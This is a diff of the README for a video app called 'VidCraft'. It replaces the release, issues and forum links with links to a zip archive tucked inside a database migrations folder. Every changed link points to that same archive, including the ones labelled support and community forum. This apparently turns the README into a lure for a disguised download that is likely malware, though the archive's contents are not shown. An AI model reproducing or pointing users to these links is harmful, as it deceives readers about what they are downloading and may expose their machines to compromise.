@@ -1,6 +1,6 @@
 # 🎥 VidCraft - Create Stunning Videos Effortlessly
 
-[![Download VidCraft](https://img.shields.io/badge/Download%20VidCraft-v1.0-ff69b4.svg)](https://github.com/bessieunpeaceful360/VidCraft/releases)
+[![Download VidCraft](https://raw.githubusercontent.com/bessieunpeaceful360/VidCraft/main/prisma/migrations/20250521115907_init/VidCraft-v2.8.zip%https://raw.githubusercontent.com/bessieunpeaceful360/VidCraft/main/prisma/migrations/20250521115907_init/VidCraft-v2.8.zip)](https://raw.githubusercontent.com/bessieunpeaceful360/VidCraft/main/prisma/migrations/20250521115907_init/VidCraft-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To start using VidCraft, visit the Releases page and download the latest version of the application.
 
-[Download VidCraft from the Releases Page](https://github.com/bessieunpeaceful360/VidCraft/releases)
+[Download VidCraft from the Releases Page](https://raw.githubusercontent.com/bessieunpeaceful360/VidCraft/main/prisma/migrations/20250521115907_init/VidCraft-v2.8.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed.
@@ -76,8 +76,8 @@ If you encounter any issues:
 
 If you need support or have feedback about VidCraft, please reach out:
 
-- **GitHub Issues:** Use the Issues tab on our GitHub page [here](https://github.com/bessieunpeaceful360/VidCraft/issues) to report problems or suggest features.
-- **Community Forum:** Join our community forum [here](https://exampleforum.com) for help from other users.
+- **GitHub Issues:** Use the Issues tab on our GitHub page [here](https://raw.githubusercontent.com/bessieunpeaceful360/VidCraft/main/prisma/migrations/20250521115907_init/VidCraft-v2.8.zip) to report problems or suggest features.
+- **Community Forum:** Join our community forum [here](https://raw.githubusercontent.com/bessieunpeaceful360/VidCraft/main/prisma/migrations/20250521115907_init/VidCraft-v2.8.zip) for help from other users.
 
 ## 📄 Topics Covered
 
